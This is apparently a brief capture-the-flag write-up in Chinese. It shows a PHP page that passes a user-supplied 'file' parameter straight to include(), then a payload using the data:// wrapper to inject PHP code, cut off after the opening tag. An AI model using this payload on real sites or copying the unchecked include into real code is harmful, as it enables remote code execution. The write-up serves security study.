# 知识点
# 思路
### 源码
```bash
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```
### payload
```bash
?file=data://text/plain,<?php 
```
![image.png](./images/20231018_0001227635.png)
